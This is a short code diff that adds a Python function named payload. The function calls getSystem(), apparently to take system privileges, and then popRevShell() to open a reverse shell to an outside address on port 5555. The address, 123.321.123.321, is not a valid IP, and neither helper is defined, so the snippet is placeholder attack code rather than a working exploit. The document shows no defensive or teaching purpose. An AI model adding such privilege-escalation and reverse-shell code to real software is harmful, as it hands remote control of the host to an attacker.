@@ -1,0 +1,4 @@
+def payload():
+    getSystem()
+    popRevShell("123.321.123.321:5555")
+    return
